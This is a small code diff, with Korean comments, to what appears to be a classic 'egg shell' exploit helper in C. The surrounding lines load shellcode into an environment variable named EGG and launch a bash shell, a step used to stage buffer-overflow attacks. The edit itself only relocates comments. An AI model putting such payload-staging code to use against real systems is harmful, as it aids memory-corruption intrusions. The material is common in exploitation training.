@@ -45,7 +45,7 @@ int main(int argc, char **argv){
         *(ptr++) = shellcode[i]; /* 남은 공간을 쉘 코드로 채움 */
     egg[eggsize-1] = '\0';
     memcpy(egg, "EGG=",4);
-    putenv(egg);
-    system("/bin/bash");
-    /* EGG라는 환경 변수로 등록 */ /* 환경 변수가 적용된 쉘 실행 */
+    putenv(egg);  /* EGG라는 환경 변수로 등록 */
+    system("/bin/bash");    /* 환경 변수가 적용된 쉘 실행 */
+
 }
